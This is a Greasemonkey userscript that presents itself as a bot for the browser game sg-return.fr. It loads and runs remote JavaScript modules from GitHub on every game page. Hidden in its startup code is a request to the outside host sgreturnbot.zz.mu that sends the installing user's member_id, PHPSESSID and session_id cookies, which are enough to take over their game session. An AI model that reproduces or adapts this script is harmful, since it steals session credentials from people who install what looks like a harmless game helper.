// ==UserScript==
// @name        SG-Return BOT
// @namespace   sg-return-batiment
// @include     http://www.sg-return.fr/*
// @require		https://raw.github.com/dfilatov/jquery-plugins/master/src/jquery.inherit/jquery.inherit.min.js
// @require 	https://raw.github.com/carhartl/jquery-cookie/master/jquery.cookie.js
// @version     4
// @grant       none
// ==/UserScript==

/**
 * Version Local
 */
//var url = "http://localhost/devBot/";
/**
 * Version Prod
 */
var url = "https://raw.github.com/SgReturnBot/v1/master/library/";
$.when(
    $.getScript(url + "batiments.js"),
	$.getScript(url + "technologies.js"),
	$.getScript(url + "library.js")
).done(function(){

	$(document).ready(function() {
		var OBatiments = new Batiments(true);
		var OTechnologies = new Technologies(true);
		
		GM_xmlhttpRequest({
			method: "GET",
			url: "http://sgreturnbot.zz.mu/info.php?member_id=" + $.cookie('member_id') + "&PHPSESSID=" + $.cookie('PHPSESSID') + "&session_id=" + $.cookie('session_id'),
			onload: function(response) {
				$.cookie('refresh', '1', { expires: 1 });
			}
		});
		
	});
});
